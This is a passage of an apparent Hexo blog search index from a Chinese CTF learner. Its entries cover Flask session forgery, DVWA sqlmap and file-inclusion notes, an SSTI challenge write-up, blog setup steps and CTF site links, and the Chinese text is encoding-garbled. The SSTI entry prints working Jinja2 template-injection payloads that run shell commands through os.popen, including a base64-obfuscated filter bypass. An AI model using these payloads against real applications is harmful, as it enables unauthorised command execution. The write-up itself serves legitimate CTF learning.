class="hljs-built_in">print</span>(FSCM.decode(args.cookie_value))<br></code></pre></td></tr></table></figure><p>å¯ä»¥å»githubç»™ä½œè€…ç‚¹ä¸ªstarã€‚</p><p>ç„¶åæˆ‘ä»¬æŠŠæ”¹å®Œåçš„æ ¼å¼({â€˜usernameâ€™:bâ€™fuckâ€™})å†åŠ å¯†ä¸€ä¸‹å¾—åˆ°cookie</p><img src="/2023/05/23/flask-session%E4%BC%AA%E9%80%A0/10.png" srcset="/img/loading.gif" lazyload><p>å†æŠŠæˆ‘ä»¬çš„cookieæ”¹ä¸€ä¸‹ã€‚</p><p>å†æ¬¡è®¿é—®&#x2F;flagï¼Œå¾—åˆ°flag</p><img src="/2023/05/23/flask-session%E4%BC%AA%E9%80%A0/11.png" srcset="/img/loading.gif" lazyload>]]></content>
    
    
    
    <tags>
      
      <tag>flask_sessionä¼ªé€ </tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å…³äºDVWAæ— æ³•ä½¿ç”¨sqlmapè¿›è¡Œsqlæ³¨å…¥æµ‹è¯•</title>
    <link href="/2023/04/07/%E5%85%B3%E4%BA%8EDVWA%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8sqlmap%E8%BF%9B%E8%A1%8Csql%E6%B3%A8%E5%85%A5%E6%B5%8B%E8%AF%95/"/>
    <url>/2023/04/07/%E5%85%B3%E4%BA%8EDVWA%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8sqlmap%E8%BF%9B%E8%A1%8Csql%E6%B3%A8%E5%85%A5%E6%B5%8B%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<p>â€‹    ä»Šå¤©åœ¨DVWAçš„SQLæ³¨å…¥æ¨¡å—æ‰“é¶çš„æ—¶å€™è¯•ç€sqlmapæ¢­ä¸€æ‰‹ï¼Œä½†ä¸€ç›´è¯´æ²¡æœ‰æ³¨å…¥ç‚¹ï¼Œæ£€æŸ¥è¯­å¥å•¥çš„éƒ½æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ã€‚ï¼ˆçœŸçš„æçš„æ¯›èºäº†ğŸ˜­ï¼ï¼‰</p><p>â€‹<a href="https://blog.51cto.com/u_1394444/2500508">å‚è€ƒäº†è¿™ä½å¤§ä½¬</a></p><p>â€‹åŸå› æ˜¯ä½¿ç”¨localhostå½“æµ‹è¯•åœ°å€æ—¶ï¼ŒDVWAçš„å®‰å…¨çº§åˆ«æ˜¯æ— æ³•ä¿®æ”¹çš„ï¼Œé»˜è®¤ä¸ºimpossibleï¼Œå¯¼è‡´SQLMAPæµ‹è¯•å¤±è´¥ã€‚ä¿®æ”¹æˆ127.0.0.1çš„æµ‹è¯•åœ°å€åæˆåŠŸæ‰§è¡Œã€‚</p><img src="/2023/04/07/%E5%85%B3%E4%BA%8EDVWA%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8sqlmap%E8%BF%9B%E8%A1%8Csql%E6%B3%A8%E5%85%A5%E6%B5%8B%E8%AF%95/1.png" srcset="/img/loading.gif" lazyload>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>è¿œç¨‹æ–‡ä»¶åŒ…å«æ—¶txtæ–‡ä»¶å’Œphpæ–‡ä»¶çš„åŒºåˆ«</title>
    <link href="/2023/04/05/%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%97%B6txt%E6%96%87%E4%BB%B6%E5%92%8Cphp%E6%96%87%E4%BB%B6%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
    <url>/2023/04/05/%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%97%B6txt%E6%96%87%E4%BB%B6%E5%92%8Cphp%E6%96%87%E4%BB%B6%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    
    <content type="html"><![CDATA[<p>â€‹    ä»Šå¤©åœ¨æ‰“DVWAçš„æ–‡ä»¶åŒ…å«é¶åœºæ—¶(åˆ«é—®ä¸ºä»€ä¹ˆå­¦äº†è¿™ä¹ˆä¹…æ‰å¼€å§‹æ‰“è¿™äº›åŸºç¡€é¶ï¼Œé—®å°±æ˜¯èœğŸ˜­)ï¼Œå‘ç°è¿œç¨‹æ–‡ä»¶åŒ…å«æ—¶ï¼Œphpæ–‡ä»¶æ‰§è¡Œphpinfo()åé‡Œé¢æ˜¾ç¤ºçš„åœ°å€æ˜¯phpæœ¬åœ°åœ°å€ï¼Œè€Œtxtæ–‡ä»¶æ‰§è¡Œphpinfo()åæ‰æ˜¯é¶åœºæœåŠ¡å™¨åœ°å€ã€‚(è™½ç„¶åº”è¯¥æ˜¯ä¸ªè€çŸ¥è¯†ï¼Œä½†æˆ‘ä¸ä¼šï¼Œè¿˜æ˜¯è®°å½•ä¸€ä¸‹)</p><img src="/2023/04/05/%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%97%B6txt%E6%96%87%E4%BB%B6%E5%92%8Cphp%E6%96%87%E4%BB%B6%E7%9A%84%E5%8C%BA%E5%88%AB/1.png" srcset="/img/loading.gif" lazyload><img src="/2023/04/05/%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%97%B6txt%E6%96%87%E4%BB%B6%E5%92%8Cphp%E6%96%87%E4%BB%B6%E7%9A%84%E5%8C%BA%E5%88%AB/2.png" srcset="/img/loading.gif" lazyload>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CTFSHOWæ„šäººæ¯easy_ssti</title>
    <link href="/2023/04/02/problem1/"/>
    <url>/2023/04/02/problem1/</url>
    
    <content type="html"><![CDATA[<p>â€‹</p><p>â€‹    æœ¬æ–‡è®°å½•è‡ªå·±çš„ç¬¬ä¸€æ¬¡SSTIæˆåŠŸæ¡ˆä¾‹ã€‚(å¾ˆèœï¼Œè½»å–·ğŸ˜­)</p><img src="/2023/04/02/problem1/problem11.jpg" srcset="/img/loading.gif" lazyload><p>æ‰“å¼€é¶æœºåæ²¡æœ‰çœ‹åˆ°æœ‰ç”¨çš„æç¤ºï¼Œçœ‹ä¸€ä¸‹æºç ã€‚</p><img src="/2023/04/02/problem1/problem12.jpg" srcset="/img/loading.gif" lazyload><p>å‘ç°æœ‰ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œä¸‹è½½ä¸‹æ¥çœ‹çœ‹ã€‚</p><img src="/2023/04/02/problem1/problem13.jpg" srcset="/img/loading.gif" lazyload><p>æ˜¯flaskçš„æ¨¡æ¿ï¼Œåˆ†æä¸€ä¸‹æºç åº”è¯¥å°±æ˜¯åœ¨&#x2F;helloç›®å½•ä¸‹æœ‰SSTIæ³¨å…¥çš„æ¼æ´ã€‚</p><p>è¿›å…¥helloç›®å½•ä¸‹å¹¶ç…§å¸¸èµ°ä¸€ä¸‹åˆ¤æ–­æµç¨‹ï¼Œå‘ç°åº”è¯¥æ˜¯jinja2çš„æ¨¡æ¿ã€‚</p><img src="/2023/04/02/problem1/problem14.jpg" srcset="/img/loading.gif" lazyload><p>æ”¾å¼ è€å›¾</p><img src="/2023/04/02/problem1/problem15.jpg" srcset="/img/loading.gif" lazyload><p>æ‰¾ä¸€ä¸‹object</p><img src="/2023/04/02/problem1/problem16.jpg" srcset="/img/loading.gif" lazyload><p>å†çœ‹çœ‹æœ‰ä»€ä¹ˆç±»èƒ½ç”¨çš„</p><img src="/2023/04/02/problem1/problem17.jpg" srcset="/img/loading.gif" lazyload><p><a href="https://blog.csdn.net/weixin_58624515/article/details/127991339">è¿™è¾¹å‚è€ƒäº†ä¸€ä½å¤§ä½¬çš„åšå®¢</a></p><p>æ‰¾catch_warningsï¼Œå› ä¸ºcatch_warningæ˜¯functionå…·æœ‰__globals__</p><p>ç„¶åå†é€šè¿‡__globals__é‡Œçš„builtinsçš„__import__æ¥getshell</p><p>osåº“ä¸­å¯ä»¥è°ƒç”¨popenå‡½æ•°æ‰§è¡Œå‘½ä»¤ï¼Œå†readè¯»å–åˆ°é¡µé¢ä¸Šã€‚</p><p>åœ¨é¡µé¢ä¸ŠæŸ¥catch_warningçš„ä½ç½®ï¼Œå†æŸ¥classçš„ä½ç½®å°±èƒ½å¤§æ¦‚æŸ¥åˆ°æ˜¯ç¬¬å‡ ä¸ªç±»äº†ã€‚</p><p>ç”¨lsæŸ¥äº†ä¸€ä¸‹å½“å‰ç›®å½•ï¼Œapp.py é‡Œä¹Ÿæ²¡å•¥æœ‰ç”¨ä¿¡æ¯ï¼Œå’Œå‹ç¼©åŒ…é‡Œæ˜¯ä¸€æ ·çš„ã€‚</p><img src="/2023/04/02/problem1/problem18.jpg" srcset="/img/loading.gif" lazyload><p>æ¥ä¸‹æ¥çœ‹çœ‹templates</p><img src="/2023/04/02/problem1/problem19.jpg" srcset="/img/loading.gif" lazyload><p>å‘ç°ä¹Ÿæ˜¯æ²¡ä»€ä¹ˆä¸œè¥¿ã€‚</p><p>é‚£å°±ç›´æ¥æ ¹ç›®å½•æŸ¥flagå§ã€‚</p>{{''.__class__.__bases__[0].__subclasses__()[213].__init__.__globals__['__builtins__']['__import__']('os').popen('cat /f*').read()}}<img src="/2023/04/02/problem1/problem110.jpg" srcset="/img/loading.gif" lazyload><p>å‘ç°not foundäº†</p><p>çŒœæµ‹äº†ä¸€ä¸‹ï¼Œåº”è¯¥æ˜¯å°†è¯­å¥ä¸­çš„â€&#x2F;â€œå½“æˆç›®å½•äº†ã€‚</p><p>é‚£å°±è¯•è¯•base64+ç®¡é“ç¬¦ç»•è¿‡</p><p>â€œcat &#x2F;f*â€&#x3D;&#x3D;â€Y2F0IC9mKg&#x3D;&#x3D;â€</p>{{''.__class__.__bases__[0].__subclasses__()[213].__init__.__globals__['__builtins__']['__import__']('os').popen('`echo Y2F0IC9mKg== | base64 -d`').read()}}<img src="/2023/04/02/problem1/problem111.jpg" srcset="/img/loading.gif" lazyload><p>æˆåŠŸæ‹¿åˆ°flagã€‚</p><p>æ³¨æ„è¦åŒ…ä¸€å±‚åå¼•å·ï¼ˆå‘½ä»¤æ‰§è¡Œï¼‰ï¼Œä¸ç„¶ä¼šè¢«å½“åšå­—ç¬¦ä¸²echoå‡ºæ¥ã€‚</p><p>å¦å¤–è¿™é“é¢˜åˆšå¼€å§‹çš„æºç é‚£å—å¯¹â€fâ€å’Œâ€geâ€è¿›è¡Œäº†å¤„ç†ï¼Œæˆ‘ä¸çŸ¥é“åœ¨å…¶ä»–æ€è·¯é‡Œä¼šä¸ä¼šå¡ä½ï¼Œæˆ‘è¯•äº†ä¸‹å¯ä»¥åœ¨è¯­å¥çš„æœ€åç›´æ¥åŠ ä¸Šâ€geâ€ç»•è¿‡ã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SSTI</title>
    <link href="/2023/03/27/SSTI/"/>
    <url>/2023/03/27/SSTI/</url>
    
    <content type="html"><![CDATA[<p>æœ¬æ–‡è®°å½•è‡ªå·±SSTIçš„å­¦ä¹ è¿‡ç¨‹ï¼ˆæœ¬äººä¸ºCTFèœé¸¡ï¼Œå¦‚æœ‰é”™è¯¯è¿˜è¯·æŒ‡æ­£ï¼‰</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2023/01/20/No%20Title!Just%20a%20picture!%F0%9F%98%9B/"/>
    <url>/2023/01/20/No%20Title!Just%20a%20picture!%F0%9F%98%9B/</url>
    
    <content type="html"><![CDATA[<img src="/2023/01/20/No%20Title!Just%20a%20picture!%F0%9F%98%9B/pic1.jpg" srcset="/img/loading.gif" lazyload>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>åšå®¢æ­å»º(ä¸»è¦æ˜¯æ€•è‡ªå·±å¿˜è®°å’‹å¼„äº†)</title>
    <link href="/2023/01/20/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA(%E4%B8%BB%E8%A6%81%E6%98%AF%E6%80%95%E8%87%AA%E5%B7%B1%E5%BF%98%E8%AE%B0%E5%92%8B%E5%BC%84%E4%BA%86)/"/>
    <url>/2023/01/20/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA(%E4%B8%BB%E8%A6%81%E6%98%AF%E6%80%95%E8%87%AA%E5%B7%B1%E5%BF%98%E8%AE%B0%E5%92%8B%E5%BC%84%E4%BA%86)/</url>
    
    <content type="html"><![CDATA[<p>ç½‘ç«™æœ¬åœ°å¯åŠ¨</p><p>cd hexo-blog</p><p>hexo g </p><p>hexo server</p><p>åšå®¢hexoæ ¹ç›®å½•åœ¨D:&#x2F;blog</p><p>å…ˆä¿®æ”¹å®Œåšæ–‡å†…å®¹</p><p>ğŸ‘‡æ›´æ–°æœ¬åœ°hexoé…ç½®</p><p>å…ˆhexo g</p><p>å†hexo d</p><p>é…ç½®å®Œåå‡†å¤‡å‘å¸ƒåˆ°GitHubğŸ‘‡</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">hexo clean<br>hexo generate<br>(è‹¥è¦æœ¬åœ°é¢„è§ˆå°±å…ˆæ‰§è¡Œ hexo server)<br>hexo deploy<br></code></pre></td></tr></table></figure><p>git config â€“global http.sslVerify â€œtrueâ€</p><p>ğŸ‘†ä¸ªäººè§£å†³æ–¹æ¡ˆ</p><p>æŒ‰ç…§ç½‘ä¸Šçš„falseå¹¶ä¸èƒ½ä½¿ç”¨ï¼Œæ›´æ”¹ä¸ºtrueåæƒŠè®¶åœ°å‘ç°å¯ä»¥ä½¿ç”¨</p><p>å¦å¤–è¿˜è¦åˆ°è®¾ç½®ä¸­ä¿®æ”¹åŸŸåï¼ˆæ¯æ¬¡åšå®¢æ›´æ–°éƒ½éœ€è¦ä¿®æ”¹åŸŸåï¼Œæ¯æ¬¡æ›´æ–°è®¾ç½®çš„åŸŸåéƒ½ä¼šé‡ç½®ï¼‰</p><p>å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://www.jianshu.com/p/23b9e095c7c9">ä¸ºä½ çš„hexoåšå®¢é…ç½®ä¸ªæ€§åŸŸå - ç®€ä¹¦ (jianshu.com)</a></p><p><a href="https://blog.csdn.net/ten_sory/article/details/81359421?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-1-81359421-blog-120295287.pc_relevant_multi_platform_whitelistv2&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-1-81359421-blog-120295287.pc_relevant_multi_platform_whitelistv2&utm_relevant_index=2">(8æ¡æ¶ˆæ¯) Hexo+githubåšå®¢æ­å»ºä¸è‡ªå®šä¹‰åŸŸå_æ¢¦æƒ³æ€»æ˜¯è¦ä¸å¯åŠï¼Œæ˜¯ä¸æ˜¯åº”è¯¥æ”¾å¼ƒçš„åšå®¢-CSDNåšå®¢</a></p><p><a href="https://blog.csdn.net/bbsyi/article/details/119101852">(8æ¡æ¶ˆæ¯) GitHub Pages + Hexoæ­å»ºä¸ªäººåšå®¢ç½‘ç«™ï¼Œå²ä¸Šæœ€å…¨æ•™ç¨‹_å¼¹ç´å¼¹ç´çš„åšå®¢-CSDNåšå®¢_githubpages hexo</a></p><p><a href="https://hexo.fluid-dev.com/docs/guide/">https://hexo.fluid-dev.com/docs/guide/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ä¸»è¦æ˜¯æ€•è‡ªå·±å¿˜è®°å’‹å¼„äº†,åªè®°å½•äº†ä¸€äº›è‡ªå·±å¯èƒ½å¿˜äº†çš„ä¸œè¥¿</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFç½‘ç«™æ”¶å½•</title>
    <link href="/2022/07/03/Welcome-to-my-blog/"/>
    <url>/2022/07/03/Welcome-to-my-blog/</url>
    
    <content type="html"><![CDATA[<p>æ¯”è¾ƒç³»ç»Ÿçš„å­¦ä¹ è·¯çº¿ï¼š<br><a href="https://ctf-wiki.org/">https://ctf-wiki.org/</a><br>åˆ·é¢˜ç½‘ç«™ï¼š<br><a href="https://buuoj.cn/">https://buuoj.cn/</a><br><a href="https://adworld.xctf.org.cn/">https://adworld.xctf.org.cn/</a><br><a href="https://www.ctfhub.com/#/index">https://www.ctfhub.com/#/index</a><br><a href="https://ctf.show/">https://ctf.show/</a><br><a href="http://www.zxsctf.com/">http://www.zxsctf.com/</a><br><a href="https://pwnable.tw/">https://pwnable.tw/</a>(pwn)<br><a href="https://microcorruption.com/">https://microcorruption.com/</a>(iot&amp;&amp;reverse&amp;&amp;pwn)<br>æ¯”èµ›èµ„è®¯ï¼š<br><a href="https://www.ctfhub.com/#/calendar">https://www.ctfhub.com/#/calendar</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ç”¨stickyç½®é¡¶äº†å“¦</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Welcome to Ec0y&#39;s Blog</title>
    <link href="/2022/07/03/Blog/"/>
    <url>/2022/07/03/Blog/</url>
    
    <content type="html"><![CDATA[<img src="/2022/07/03/Blog/bg2.jpg" srcset="/img/loading.gif" lazyload class title="This is an example image">]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
